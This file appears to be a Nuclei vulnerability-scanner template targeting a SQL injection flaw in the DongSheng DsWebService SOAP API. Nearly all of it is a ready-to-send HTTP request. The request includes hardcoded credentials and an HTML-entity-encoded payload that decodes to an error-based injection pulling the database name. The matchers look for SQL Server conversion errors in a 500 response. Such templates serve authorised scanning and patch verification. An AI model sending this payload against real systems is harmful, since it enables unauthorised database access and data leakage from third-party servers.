nuclei_rules/DongSheng-DsWebService-sqlInjection.yaml

id: DongSheng-DsWebService-sqlInjection

info:
  name: DongSheng-DsWebService-sqlInjection
  author: iSee857
  severity: high
  description: |
    DongSheng-DsWebService-sqlInjection

http:
  - raw:
      - |
        POST /Webservice/DsWebService.asmx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/soap+xml;charset=UTF-8;action="DsWebService/GetSeaiBsDataList"

        <soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:dsw="DsWebService">
           <soap:Header/>
           <soap:Body>
              <dsw:GetSeaiBsDataList>
                 <!--Optional:-->
                 <dsw:LoginName>qdtaize</dsw:LoginName>
                 <!--Optional:-->
                 <dsw:LoginPass>EBBE3242-D49E-4398-BBFE-0133CA655EB5</dsw:LoginPass>
                 <!--Optional:-->
                 <dsw:Mobile>&#x31;&#x27;&#x29;&#x20;&#x4f;&#x52;&#x20;&#x31;&#x3d;&#x28;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x54;&#x4f;&#x50;&#x20;&#x31;&#x20;&#x44;&#x42;&#x5f;&#x4e;&#x41;&#x4d;&#x45;&#x28;&#x29;&#x29;&#x20;&#x2d;&#x2d;&#x20;</dsw:Mobile>
                 <!--Optional:-->
                 <dsw:Mblno>1</dsw:Mblno>
                 <dsw:start>1</dsw:start>
                 <dsw:limit>1</dsw:limit>
              </dsw:GetSeaiBsDataList>
           </soap:Body>
        </soap:Envelope>

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "nvarchar"
          - "数据类型"
          - "int"
        condition: and

      - type: status
        status:
          - 500